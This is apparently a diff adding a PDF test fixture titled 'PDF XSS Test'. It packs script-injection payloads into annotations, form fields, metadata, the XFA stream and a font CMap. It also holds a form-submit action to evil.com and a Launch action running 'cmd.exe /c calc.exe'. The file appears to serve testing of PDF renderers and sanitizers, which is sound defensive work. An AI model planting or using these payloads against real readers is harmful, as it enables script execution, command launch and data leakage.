@@ -1,0 +1,119 @@
+%PDF-1.7
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /Metadata 9 0 R /AcroForm 10 0 R /StructTreeRoot 11 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> /XObject << /X1 8 0 R >> >> /Annots [5 0 R 6 0 R 7 0 R 12 0 R 13 0 R 14 0 R] /Contents 15 0 R >>
+endobj
+4 0 obj
+<< /Type /Font /Subtype /Type0 /BaseFont /Helvetica /Encoding /Identity-H /DescendantFonts [] /ToUnicode 16 0 R >>
+endobj
+5 0 obj
+<< /Type /Annot /Subtype /Link /Rect [50 700 300 720] /A << /S /URI /URI (javascript:alert('XSS_URI')) >> >>
+endobj
+6 0 obj
+<< /Type /Annot /Subtype /Text /Rect [50 670 300 690] /Title (&#x3C;svg onload=alert`XSS_TITLE`&#x3E;) /Contents (XSS Title) >>
+endobj
+7 0 obj
+<< /Type /Annot /Subtype /Widget /Rect [50 640 300 660] /T (input1) /V (<svg><image onerror=alert(`XSS_WIDGET`) /></svg>) >>
+endobj
+8 0 obj
+<< /Type /XObject /Subtype /Form /BBox [0 0 300 300] /Length 59 >>
+stream
+<svg><image href='x' onerror='alert(`XSS_XOBJECT`)'/></svg>
+endstream
+endobj
+9 0 obj
+<< /Type /Metadata /Subtype /XML /Length 227 >>
+stream
+<?xpacket begin=' '?> <x:xmpmeta xmlns:x='adobe:ns:meta/'>
+<dc:title><rdf:Alt><rdf:li xml:lang='x-default'>
+<svg><image href='x' onerror='alert(`XSS_META`)'/></svg>
+</rdf:li></rdf:Alt></dc:title></x:xmpmeta> <?xpacket end='w'?>
+endstream
+endobj
+10 0 obj
+<< /XFA 17 0 R /Fields [] >>
+endobj
+11 0 obj
+<< /Type /StructTreeRoot /K [<< /S /Span /T (<svg onload=alert(`XSS_STRUCT`)>) >>] >>
+endobj
+12 0 obj
+<< /Type /Annot /Subtype /Widget /Rect [50 610 300 630] /FT /Btn /Ff 65536 /T (btn) /A << /S /SubmitForm /F (http://evil.com/?XSS_SUBMIT) >> >>
+endobj
+13 0 obj
+<< /Type /Annot /Subtype /Link /Rect [50 580 300 600] /A << /S /Launch /F (cmd.exe /c calc.exe) >> >>
+endobj
+14 0 obj
+<< /Type /Annot /Subtype /RichMedia /Rect [50 550 300 570] /RichMediaSettings << /Activation << /Condition /XA >> >> /RichMediaContent << /Assets << /Names [(X.js) 18 0 R] >> >> >>
+endobj
+15 0 obj
+<< /Length 51 >>
+stream
+BT /F1 12 Tf 100 700 Td (PDF XSS Test) Tj ET
+/Do X1
+endstream
+endobj
+16 0 obj
+<< /Length 361 >>
+stream
+/CIDInit /ProcSet findresource begin
+12 dict begin
+begincmap
+/CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def
+/CMapName /PoC def
+/CMapType 2 def
+1 begincodespacerange
+<00> <ff>
+endcodespacerange
+1 beginbfrange
+<58> <58> (<img src=x onerror=alert(`ToUnicodeXSS`)>)
+endbfrange
+endcmap
+CMapName currentdict /CMap defineresource pop
+end end
+
+endstream
+endobj
+17 0 obj
+<< /Length 166 >>
+stream
+<?xml version="1.0"?><xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+<data><field1><![CDATA[<svg><image onerror='alert("XSS_XFA")'/></svg>]]></field1></data></xdp:xdp>
+endstream
+endobj
+18 0 obj
+<< /Type /EmbeddedFile /Length 28 >>
+stream
+console.log('XSS_JS_ASSET');
+endstream
+endobj
+xref
+0 19
+0000000000 65535 f 
+0000000009 00000 n 
+0000000159 00000 n 
+0000000309 00000 n 
+0000000459 00000 n 
+0000000609 00000 n 
+0000000759 00000 n 
+0000000909 00000 n 
+0000001059 00000 n 
+0000001209 00000 n 
+0000001359 00000 n 
+0000001509 00000 n 
+0000001659 00000 n 
+0000001809 00000 n 
+0000001959 00000 n 
+0000002109 00000 n 
+0000002259 00000 n 
+0000002409 00000 n 
+0000002559 00000 n 
+trailer
+<< /Root 1 0 R /Size 19 >>
+startxref
+2830
+%%EOF
